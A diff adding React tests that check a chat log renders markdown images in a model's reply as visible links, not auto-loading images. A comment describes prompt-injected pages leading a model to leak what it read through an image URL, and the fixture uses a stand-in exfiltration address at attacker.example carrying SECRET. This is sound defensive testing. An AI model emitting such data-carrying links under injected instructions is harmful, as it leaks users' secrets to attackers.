@@ -187,3 +187,33 @@ describe("ChatLog with tool calls", () => {
     expect(screen.getByTestId("tool-result-message")).toHaveTextContent("tool result · c");
   });
 });
+
+describe("ChatLog with images in a model's reply", () => {
+  // A prompt-injected page can make a model write an image whose address
+  // carries what it read. Rendering it as an <img> fetches that address the
+  // moment the reply arrives, with nobody clicking anything.
+  const leak = "https://attacker.example/pixel.png?q=SECRET";
+
+  it("renders a markdown image in a reply as a link, never an image", () => {
+    render(
+      <ChatLog
+        messages={[{ role: "assistant", content: `Here you go: ![a chart](${leak})` }]}
+        pending={false}
+      />,
+    );
+    expect(document.querySelector(`img[src="${leak}"]`)).toBeNull();
+    expect(document.querySelectorAll("img")).toHaveLength(0);
+    const link = screen.getByRole("link", { name: /a chart/ });
+    expect(link).toHaveAttribute("href", leak);
+    expect(link).toHaveAttribute("target", "_blank");
+    expect(link).toHaveAttribute("rel", "noreferrer");
+    // The address is visible, so nobody opens it without seeing where it goes.
+    expect(link).toHaveTextContent(leak);
+  });
+
+  it("names an image with no alt text as an image", () => {
+    render(<ChatLog messages={[{ role: "assistant", content: `![](${leak})` }]} pending={false} />);
+    expect(document.querySelectorAll("img")).toHaveLength(0);
+    expect(screen.getByRole("link", { name: /image/ })).toHaveAttribute("href", leak);
+  });
+});
